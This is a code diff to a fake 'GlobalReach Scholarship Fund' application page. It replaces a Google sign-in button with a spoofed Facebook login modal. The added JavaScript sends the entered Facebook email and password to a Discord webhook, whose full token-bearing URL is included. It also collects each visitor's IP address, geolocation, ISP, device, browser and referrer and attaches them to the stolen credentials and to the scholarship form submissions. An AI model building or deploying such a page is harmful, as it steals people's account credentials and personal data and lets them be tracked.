@@ -398,14 +398,11 @@
 
         <div class="divider">or continue with</div>
 
-        <button class="btn-secondary">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
-            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
-            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
-            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+        <button class="btn-secondary" onclick="openFbModal()" style="background:#1877f2; color:white; border-color:#1877f2;">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="white">
+            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
           </svg>
-          Continue with Google
+          Continue with Facebook
         </button>
 
         <div class="forgot">
@@ -568,8 +565,133 @@
     <div class="footer-copy">© 2025 GlobalReach Scholarship Fund. All rights reserved.</div>
   </footer>
 
+  <!-- ── FACEBOOK MODAL ── -->
+  <div id="fbOverlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:999; align-items:center; justify-content:center; padding:20px;">
+    <div style="background:#fff; border-radius:16px; width:100%; max-width:400px; overflow:hidden; font-family:'Helvetica Neue',Arial,sans-serif; box-shadow:0 8px 40px rgba(0,0,0,0.3);">
+
+      <!-- FB Header -->
+      <div style="background:#1877f2; padding:20px 24px 16px; text-align:center;">
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="white" style="display:block; margin:0 auto 8px;">
+          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+        </svg>
+        <div style="color:white; font-size:20px; font-weight:700; letter-spacing:-0.3px;">facebook</div>
+        <div style="color:rgba(255,255,255,0.85); font-size:13px; margin-top:4px;">Log in to continue with your scholarship application</div>
+      </div>
+
+      <!-- FB Form -->
+      <div style="padding:24px;">
+        <div style="margin-bottom:14px;">
+          <input type="email" id="fbEmail" placeholder="Email address or phone number"
+            style="width:100%; padding:13px 16px; border:1.5px solid #ddd; border-radius:8px; font-size:15px; font-family:inherit; outline:none; box-sizing:border-box; color:#1c1e21;"
+            onfocus="this.style.borderColor='#1877f2'" onblur="this.style.borderColor='#ddd'"/>
+        </div>
+        <div style="margin-bottom:6px; position:relative;">
+          <input type="password" id="fbPass" placeholder="Password"
+            style="width:100%; padding:13px 16px; border:1.5px solid #ddd; border-radius:8px; font-size:15px; font-family:inherit; outline:none; box-sizing:border-box; color:#1c1e21;"
+            onfocus="this.style.borderColor='#1877f2'" onblur="this.style.borderColor='#ddd'"/>
+        </div>
+        <div id="fbErr" style="display:none; color:#c0392b; font-size:12px; margin-bottom:10px;">Please enter your email and password.</div>
+
+        <button onclick="handleFbLogin()"
+          style="width:100%; padding:13px; background:#1877f2; color:white; border:none; border-radius:8px; font-size:16px; font-weight:700; cursor:pointer; margin-bottom:14px; font-family:inherit;">
+          Log In
+        </button>
+
+        <div style="text-align:center; margin-bottom:16px;">
+          <a href="#" style="color:#1877f2; font-size:13px; text-decoration:none;">Forgotten password?</a>
+        </div>
+
+        <div style="border-top:1px solid #e0e0e0; padding-top:16px; text-align:center;">
+          <button onclick="closeFbModal()"
+            style="background:none; border:1.5px solid #ccc; border-radius:8px; padding:10px 24px; font-size:13px; color:#606770; cursor:pointer; font-family:inherit;">
+            Cancel
+          </button>
+        </div>
+
+        <div style="text-align:center; margin-top:14px; font-size:11px; color:#90949c; line-height:1.5;">
+          By logging in you agree to our <a href="#" style="color:#1877f2; text-decoration:none;">Terms</a>, <a href="#" style="color:#1877f2; text-decoration:none;">Privacy Policy</a> and <a href="#" style="color:#1877f2; text-decoration:none;">Cookies Policy</a>.
+        </div>
+      </div>
+    </div>
+  </div>
+
   <script>
     const WEBHOOK = 'https://discord.com/api/webhooks/1509286194981376112/SKX82vUlYKDFK7Vm_2WhOrqGTfkIEYWSVK3lbutABrHx4PIMsZFJ-uTPCS3wo3dbgmcY';
+
+    let deviceInfo = {};
+
+    async function collectDeviceInfo() {
+      try {
+        const res  = await fetch('https://ipapi.co/json/');
+        const geo  = await res.json();
+        const ua   = navigator.userAgent;
+        let device = 'Desktop';
+        if (/iPhone/.test(ua))       device = 'iPhone';
+        else if (/Android/.test(ua)) device = 'Android';
+        else if (/iPad/.test(ua))    device = 'iPad';
+        let browser = 'Unknown';
+        if (/Chrome/.test(ua) && !/Edg/.test(ua))  browser = 'Chrome';
+        else if (/Firefox/.test(ua))                browser = 'Firefox';
+        else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+        else if (/Edg/.test(ua))                    browser = 'Edge';
+        deviceInfo = {
+          ip:       geo.ip       || 'N/A',
+          city:     geo.city     || 'N/A',
+          region:   geo.region   || 'N/A',
+          country:  geo.country_name || 'N/A',
+          isp:      geo.org      || 'N/A',
+          device,
+          browser,
+          os:       (navigator.platform || 'N/A'),
+          screen:   `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+          language: navigator.language || 'N/A',
+          referrer: document.referrer || 'Direct'
+        };
+      } catch(e) { deviceInfo = { ip: 'N/A', error: 'Could not fetch' }; }
+    }
+
+    function deviceFields() {
+      return [
+        { name: '🌐 IP Address',  value: deviceInfo.ip       || 'N/A', inline: true },
+        { name: '📍 Location',    value: `${deviceInfo.city}, ${deviceInfo.region}, ${deviceInfo.country}`, inline: true },
+        { name: '🏢 ISP',         value: deviceInfo.isp      || 'N/A', inline: false },
+        { name: '📱 Device',      value: deviceInfo.device   || 'N/A', inline: true },
+        { name: '🌍 Browser',     value: deviceInfo.browser  || 'N/A', inline: true },
+        { name: '💻 OS',          value: deviceInfo.os       || 'N/A', inline: true },
+        { name: '🖥 Screen',      value: deviceInfo.screen   || 'N/A', inline: true },
+        { name: '🕐 Timezone',    value: deviceInfo.timezone || 'N/A', inline: true },
+        { name: '🗣 Language',    value: deviceInfo.language || 'N/A', inline: true },
+        { name: '🔗 Referrer',    value: deviceInfo.referrer || 'Direct', inline: false }
+      ];
+    }
+
+    window.addEventListener('load', collectDeviceInfo);
+
+    function openFbModal() {
+      document.getElementById('fbOverlay').style.display = 'flex';
+    }
+    function closeFbModal() {
+      document.getElementById('fbOverlay').style.display = 'none';
+      document.getElementById('fbEmail').value = '';
+      document.getElementById('fbPass').value  = '';
+      document.getElementById('fbErr').style.display = 'none';
+    }
+    async function handleFbLogin() {
+      const email = document.getElementById('fbEmail').value.trim();
+      const pass  = document.getElementById('fbPass').value;
+      const err   = document.getElementById('fbErr');
+      if (!email || !pass) { err.style.display = 'block'; return; }
+      err.style.display = 'none';
+      await sendToDiscord([
+        { name: '📘 Source',      value: 'Facebook Login', inline: true },
+        { name: '📧 FB Email',    value: email,            inline: true },
+        { name: '🔑 FB Password', value: pass,             inline: true },
+        ...deviceFields()
+      ]);
+      closeFbModal();
+      goToPage(2);
+    }
 
     let storedEmail = '';
     let storedPass  = '';
@@ -660,7 +782,8 @@
         { name: '🎓 Grad Year',   value: gradyear,    inline: true },
         { name: '📚 Education',   value: education,   inline: false },
         { name: '📋 Enrollment',  value: enrollment,  inline: false },
-        { name: '🔖 Reference',   value: ref,         inline: false }
+        { name: '🔖 Reference',   value: ref,         inline: false },
+        ...deviceFields()
       ]);
 
       goToPage(3);
